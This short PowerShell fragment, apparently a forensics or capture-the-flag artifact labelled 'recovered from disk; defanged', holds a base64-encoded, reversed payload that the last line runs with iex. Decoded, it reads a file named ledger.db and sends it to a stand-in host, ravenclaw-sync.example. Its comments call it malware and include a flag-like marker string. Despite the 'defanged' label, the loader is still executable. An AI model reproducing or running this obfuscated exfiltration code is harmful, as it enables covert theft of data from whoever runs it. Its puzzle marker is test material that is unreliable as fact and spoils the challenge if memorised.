# recovered from disk; defanged. deobfuscate: base64-decode, then reverse the text.
$b='CmQkIHlkb0ItIHgvZWxwbWF4ZS5jbnlzLXdhbGNuZXZhci8vOnB0dGggaXJVLSBkbmVTIDtiZC5yZWdkZWwgdG5ldG5vQy10ZUc9ZCQKKXN0aWdpZCBJSUNTQSBzdGkoIGhjb3BlIGVtaXQtcG9yZCBlaHQgaHRpdyBkZWxhZXMtUk9YIHNpIG5pYi5saWZ4ZSAjCjlSV1p3QlhZeWQzWGs1V1lmUldaekpYWjJWbWNmbEhidTkyWHpGMmRmSlhad0IzYnlSMlhsaEdkN1ZrVCA6cmVrcmFtLTJmICMKKWVyYXdsYW0oICdyZXRhZHB1JyBraXZ0bGFzICM=';
iex ( [string]::Join('', ([char[]][Convert]::FromBase64String($b))[-1..-99999]) )
